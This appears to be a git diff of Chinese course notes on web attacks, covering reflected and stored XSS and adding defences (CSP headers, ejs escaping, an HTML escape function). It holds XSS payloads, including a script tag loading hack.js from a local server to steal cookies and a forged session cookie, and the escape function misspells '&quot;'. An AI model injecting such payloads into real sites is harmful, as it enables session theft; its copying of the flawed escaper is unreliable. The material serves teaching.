@@ -18,7 +18,7 @@
 
 ## 常见Web攻击
 
-### 1、XSS
+### 一、XSS
 
 > Cross Site Scripting --- 跨站脚本攻击
 >
@@ -42,20 +42,25 @@ http://localhost:3000/?from=china
 // alert尝试
 http://localhost:3000/?from=<script>alert(3)</script>
 // 获取Cookie
-http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
-</script>
+http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>
 // 短域名伪造 https://dwz.cn/
 // 伪造cookie入侵 chrome
-document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNT
-Y1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
+document.cookie="cookie:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
 
 ```
 
 
 
-
-
 - 存储型 - 存储到DB后读取时注入
+
+```js
+// 评论
+<script>alert(1)</script>
+// 跨站脚本注入
+我来了<script src="http://localhost:4000/hack.js"></script>
+```
+
+
 
 
 
@@ -69,6 +74,76 @@ Y1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
 - 偷取用户的资料
 - 偷取用户的秘密和登录态
 - 欺骗用户
+
+
+
+#### 防范手段
+
+##### 1、CSP
+
+> **内容安全策略** (CSP, Content Security Policy) 是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注入等攻击。 这些攻击可用于实现从数据窃取到 网站破坏或作为恶意软件分发版本等用途。
+>
+> CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只 需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻 击。
+
+```js
+// 只允许加载本站资源
+Content-Security-Policy: default-src 'self'
+// 只允许加载 HTTPS 协议图片
+Content-Security-Policy: img-src https://*
+// 不允许加载任何来源框架
+Content-Security-Policy: child-src 'none'
+```
+
+```js
+ctx.set('Content-Security-Policy', "default-src 'self'")
+// 尝试一下外部资源不能加载
+http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>
+```
+
+
+
+##### 2、转义字符
+
+ejs转义
+
+```html
+<% code %>	:	用于执行其中javascript代码
+<%= code %>	:	会对code进行html转义
+<%- code %>	:	将不会进行转义
+```
+
+
+
+##### 3、黑名单
+
+> 用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠 进行转义
+
+```js
+function escape(str) {
+  str = str.replace(/&/g, '&amp;')
+  str = str.replace(/</g, '&lt;')
+  str = str.replace(/>/g, '&gt;')
+  str = str.replace(/"/g, '&quto;')
+  str = str.replace(/'/g, '&#39;')
+  str = str.replace(/`/g, '&#96;')
+  str = str.replace(/\//g, '&#x2F;')
+  return str
+}
+```
+
+0.42
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
